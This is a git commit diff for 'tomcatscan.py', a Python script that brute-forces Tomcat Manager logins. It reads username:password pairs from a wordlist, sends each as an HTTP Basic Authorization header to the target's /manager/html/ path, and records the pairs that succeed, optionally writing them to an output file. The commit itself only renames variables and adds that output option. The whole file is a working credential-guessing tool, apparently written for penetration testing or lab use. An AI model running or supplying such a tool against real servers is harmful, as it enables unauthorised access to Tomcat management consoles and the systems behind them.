c8c44c03d335bbe18fd41b3e6e850c0d10265ad6
Adrian <hadrian3689@gmail.com>
2021-12-27 23:59:31 -0500

    Updated variables and fixed optional arguments

--- tomcatscan.py
+++ tomcatscan.py
@@ -1,61 +1,91 @@
 import requests
-import time
 import base64
 import argparse
 
-def encode(i):
-    encoded = i.encode("ascii")
-    encoded = base64.b64encode(encoded)
-    encoded = encoded.decode("ascii")
-    encoded = "Basic " + encoded 
+def output_file_check(url,file,output_file):
+    if output_file == "none":
+        scanner_nofile(url,file)
+    else:
+        scanner_with_file(url,file,output_file)
 
-    return encoded
+def encode(creds):
+    encoded_string_bytes = creds.encode("ascii")
+    encoded_base64_bytes = base64.b64encode(encoded_string_bytes)
+    base64_string = encoded_base64_bytes.decode("ascii")
+    auth = "Basic " + base64_string 
 
-def scanner(url,file):
-    url = url + "/manager/html/"
-    l = open(file,'r')
-    
-    win = open("creds.txt","w") 
-    win.close()
+    return auth
 
-    for i in l:
-        i = i.strip()
-        encoded = encode(i)
+def scanner_nofile(url,file):
+    full_url = url + "/manager/html/"
+    wordlist_file = open(file,'r')
+
+    for creds in wordlist_file:
+        creds = creds.strip()
+        auth = encode(creds)
         
-        header = {"Authorization": encoded}
-        r = requests.get(url,headers=header)
+        auth_header = {"Authorization": auth}
+        req_site = requests.get(full_url,headers=auth_header)
     
-        if r.status_code == 200:
-            print("Founds Credentials: ",i)
-            win = open("creds.txt","a") 
-            win.write(i)
-            win.write("\n") 
-            time.sleep(1)
+        if req_site.status_code == 200:
+            print("Founds Credentials: ",creds)
         else:
-            print("Credentials: " + i + " are wrong!")
             continue
     
-    l.close()
-    win.close()
-    print("Done! Check your creds.txt for any passwords found!")
+    wordlist_file.close()
+    print("Done!")
+    exit()
+
+def scanner_with_file(url,file,output_file):
+    full_url = url + "/manager/html/" 
+    wordlist_file = open(file,'r')
+    
+    creds_found_file = open(output_file,"w") 
+    creds_found_file.write("Found Credentials:\n")
+    creds_found_file.close()
+
+    for creds in wordlist_file:
+        creds = creds.strip()
+        auth = encode(creds)
+        
+        auth_header = {"Authorization": auth}
+        req_site = requests.get(full_url,headers=auth_header)
+    
+        if req_site.status_code == 200:
+            print("Founds Credentials: ",creds)
+            creds_found_file = open(output_file,"a")
+            creds_found_file.write(creds)
+            creds_found_file.write("\n")
+        else:
+            continue
+    
+    wordlist_file.close()
+    creds_found_file.close()
+    print("Done! Check your " + output_file + " for any passwords found!")
     exit()
 
 def main():
     parser = argparse.ArgumentParser(description='Tomcat User:Password Scanner')
 
     parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://scantomcat.blah', required=True)
-    parser.add_argument('-f', metavar="<Wordlist>",default='list.txt', help='WordList To Use')
+    parser.add_argument('-f', metavar="<Wordlist>",help='WordList To Use. Required format is username:password', required=True)
+    parser.add_argument('-w', metavar='<Output>', default='none', help='Name of output file', required=False)
 
     args = parser.parse_args()
 
     url = args.t
     file = args.f
+    output_file = args.w
 
     print("Welcome to Tomcat user:password scanner!")
-    time.sleep(1)
+    print("Scanning for usernames and passwords...")
     
-    scanner(url,file)
-
+    while True:
+        try:
+            output_file_check(url,file,output_file)
+        except KeyboardInterrupt:
+            print("Bye Bye!")
+            exit()
 
 if __name__ == "__main__":
     main()
